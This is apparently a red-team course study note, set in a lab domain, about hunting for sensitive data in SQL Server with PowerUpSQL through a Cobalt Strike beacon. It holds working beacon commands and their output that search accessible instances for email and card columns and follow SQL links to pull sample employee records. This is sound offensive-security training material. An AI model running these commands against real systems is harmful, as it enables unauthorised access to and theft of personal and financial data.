
Description of Topic/Concept/Tool/Technology goes here

#### 🖊️ via Cobalt Strike

PowerUpSQL provides various cmdlets designed for data searching and extraction.  One such cmdlet is `Get-SQLColumnSampleDataThreaded`, which can search one or more instances for databases that contain particular keywords in the column names.

1) Search (it will only search for instances you have access to):

```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize

Instance                     Database Column                   Sample                  
--------                     -------- ------                   ------                  
sql-2.dev.cyberbotic.io,1433 master   email                    ritzhaki0@gov.uk        
sql-2.dev.cyberbotic.io,1433 master   email                    ldureden1@angelfire.com 
sql-2.dev.cyberbotic.io,1433 master   email                    gfaussett2@quantcast.com
sql-2.dev.cyberbotic.io,1433 master   email                    bcrumb3@cpanel.net
```

2) The previos command won't traverse any SQL links. To search over the links use `Get-SQLQuery`.

```
 beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME            TABLE_TYPE
------------- ------------ ----------            ----------
master        dbo          spt_fallback_db       BASE TABLE
master        dbo          spt_fallback_dev      BASE TABLE
master        dbo          spt_fallback_usg      BASE TABLE
master        dbo          employees             BASE TABLE
master        dbo          spt_values            VIEW
```

Notice how it searches for a link between the DB that we find we can access and the other one.

3) Using the link you can list columns

```
beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"

column_name   
-----------   
id            
first_name    
last_name     
gender
```

4) And you can then take the data samples:

```
beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"

first_name gender sort_code
---------- ------ ---------
Juliann    Female 09-46-87 
Rhodie     Female 89-74-73 
Calypso    Female 77-33-04
```

To simulate data exfiltration of large dataset, have a look at [Egress Assess](https://github.com/FortyNorthSecurity/Egress-Assess).


#### ⚠ Opsec




### Properties
---
📆 created   {{29-02-2024}} 22:38
🏷️ tags: #redteam #crto 

---

